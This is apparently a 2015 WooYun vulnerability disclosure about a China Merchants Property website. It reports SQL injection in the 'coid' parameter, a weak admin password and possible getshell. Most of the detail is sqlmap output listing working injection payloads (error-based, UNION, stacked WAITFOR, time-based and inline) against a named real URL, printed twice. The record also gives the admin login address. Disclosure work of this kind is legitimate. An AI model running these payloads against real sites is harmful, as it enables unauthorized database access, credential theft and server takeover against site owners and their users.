wybug_title: 招商地产某站点SQL注入+后台弱口令+可getshell
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-02-11：	细节已通知厂商并且等待厂商处理中									2015-02-13：	厂商已经确认，细节仅向厂商公开									2015-02-23：	细节向核心白帽子及相关领域专家公开									2015-03-05：	细节向普通白帽子公开									2015-03-15：	细节向实习白帽子公开									2015-03-28：	细节向公众公开  简要描述： 家在情在.招商地产某站点SQL注入,可以获取后台大量数据库及表信息(包含后台账号)，后台账号弱口令，可getshell 详细说明：  问题url：www.cmpd.cn/web/societyidea.aspx?typeid=30&coid=166问题参数：coidsqlmap identified the following injection points with a total of 249 HTTP(s) requests:---Place: GETParameter: coid    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: typeid=30&coid=166 AND 4892=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(107)+CHAR(101)+CHAR(113)+(SELECT (CASE WHEN (4892=4892) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(119)+CHAR(104)+CHAR(113)))    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: typeid=30&coid=166 UNION ALL SELECT CHAR(113)+CHAR(120)+CHAR(107)+CHAR(101)+CHAR(113)+CHAR(80)+CHAR(67)+CHAR(75)+CHAR(120)+CHAR(99)+CHAR(118)+CHAR(85)+CHAR(75)+CHAR(116)+CHAR(114)+CHAR(113)+CHAR(107)+CHAR(119)+CHAR(104)+CHAR(113)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: typeid=30&coid=166; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: typeid=30&coid=166 WAITFOR DELAY '0:0:5'--    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: typeid=30&coid=(SELECT CHAR(113)+CHAR(120)+CHAR(107)+CHAR(101)+CHAR(113)+(SELECT (CASE WHEN (7162=7162) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(119)+CHAR(104)+CHAR(113))---web server operating system: Windows 2008web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2008sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: coid    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: typeid=30&coid=166 AND 4892=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(107)+CHAR(101)+CHAR(113)+(SELECT (CASE WHEN (4892=4892) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(119)+CHAR(104)+CHAR(113)))    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: typeid=30&coid=166 UNION ALL SELECT CHAR(113)+CHAR(120)+CHAR(107)+CHAR(101)+CHAR(113)+CHAR(80)+CHAR(67)+CHAR(75)+CHAR(120)+CHAR(99)+CHAR(118)+CHAR(85)+CHAR(75)+CHAR(116)+CHAR(114)+CHAR(113)+CHAR(107)+CHAR(119)+CHAR(104)+CHAR(113)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: typeid=30&coid=166; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: typeid=30&coid=166 WAITFOR DELAY '0:0:5'--    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: typeid=30&coid=(SELECT CHAR(113)+CHAR(120)+CHAR(107)+CHAR(101)+CHAR(113)+(SELECT (CASE WHEN (7162=7162) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(119)+CHAR(104)+CHAR(113))---web server operating system: Windows 2008web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2008
后台地址：http://www.cmpd.cn/admin/login.aspx

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-02-13 13:54 厂商回复： CNVD确认所述漏洞情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无
